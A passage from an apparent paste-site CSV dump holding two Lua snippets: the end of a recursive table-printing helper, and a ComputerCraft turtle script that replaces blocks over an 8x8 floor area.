    return types[type(x)](x)
end

table.visualize = function(tbl,idx)
    if not idx then idx = 0 end
    if idx == 100 then return ""[1] = nil"" end
    local re = {}
    for i,v in pairs(tbl) do 
        table.insert(re,string.rep(""\t"",idx)..""[""..format(i)..""] = ""..format(v).."" (""..type(v).."")\n"")
        if type(v) == ""table"" then 
            if v == tbl then 
                table.insert(re,string.rep(""\t"",idx)..""[""..format(i)..""] = ""..""<recursive table>\n"")
            else
                table.insert(re,table.visualize(v,idx+1))
            end
        end
    end
    return table.concat(re)
end
setreadonly(table,true)
return table.visualize"
UX2L9NZq,Replace8x8,PetersonE1,Lua,Sunday 18th of February 2024 03:09:32 PM CDT,"for i = 1, 4 do
	for i = 1, 7 do
		turtle.digDown()
		turtle.placeDown()
		turtle.forward()
	end
	turtle.digDown()
	turtle.placeDown()
	turtle.turnRight()
	turtle.dig()
	turtle.forward()
	turtle.turnRight()
	for i = 1, 7 do
		turtle.digDown()
		turtle.placeDown()
		turtle.forward()
	end
	turtle.digDown()
	turtle.placeDown()
	turtle.turnLeft()
	turtle.dig()
	turtle.forward()
	turtle.turnLeft()
end"
